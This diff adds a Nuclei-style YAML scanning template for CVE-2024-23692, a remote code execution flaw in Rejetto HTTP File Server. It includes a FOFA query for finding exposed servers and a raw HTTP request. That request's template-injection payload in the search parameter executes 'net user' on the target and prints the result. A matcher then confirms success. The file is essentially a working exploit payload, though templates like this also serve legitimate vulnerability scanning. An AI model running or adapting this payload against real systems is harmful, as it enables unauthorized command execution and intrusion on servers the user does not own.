@@ -1,0 +1,33 @@
+id: Rejetto-HTTP-File-Server-Rce
+
+info:
+  name: Rejetto HTTP File Server远程代码执行漏洞（CVE-2024-23692）
+  author: god
+  severity: critical
+  description: Rejetto HTTP File Server远程代码执行漏洞（CVE-2024-23692）
+  metadata:
+    fofa-query: app="HFS"
+  tags: Rejetto,rce,cve
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /?n=%0A&cmd=net%20user&search=%25xxx%25url:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.} HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate, br
+    Connection: close
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - Administrator
+      condition: and
+
